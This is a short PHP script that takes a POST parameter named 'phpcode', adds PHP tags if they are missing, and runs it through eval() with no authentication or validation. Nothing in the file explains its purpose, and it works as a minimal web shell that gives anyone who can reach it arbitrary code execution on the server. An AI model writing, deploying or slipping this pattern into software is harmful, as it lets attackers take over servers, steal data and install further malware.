<?php
$phpcode = $_POST['phpcode'];
$phpcode = trim($phpcode);
	
if (!preg_match('#<\?#si', $phpcode)) 
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";

eval("?".">$phpcode<?");

exit;
?>